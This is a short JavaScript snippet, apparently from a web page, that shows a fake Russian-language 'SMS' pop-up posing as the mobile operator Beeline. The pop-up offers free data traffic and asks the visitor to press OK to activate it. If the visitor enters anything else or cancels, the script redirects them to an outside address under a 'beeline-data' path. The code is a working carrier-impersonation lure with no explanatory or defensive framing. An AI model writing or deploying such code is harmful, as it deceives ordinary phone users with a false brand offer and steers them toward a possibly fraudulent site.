var password = 'АКТИВИРОВАТЬ'
password=prompt('SMS: Поздравляем, ваш номер Beeline имеет право на бесплатный трафик данных. Нажмите OK, чтобы активировать сейчас.','АКТИВИРОВАТЬ');
if (password != 'АКТИВИРОВАТЬ') {
location.href='https://phlug.org/beeline-data';
}
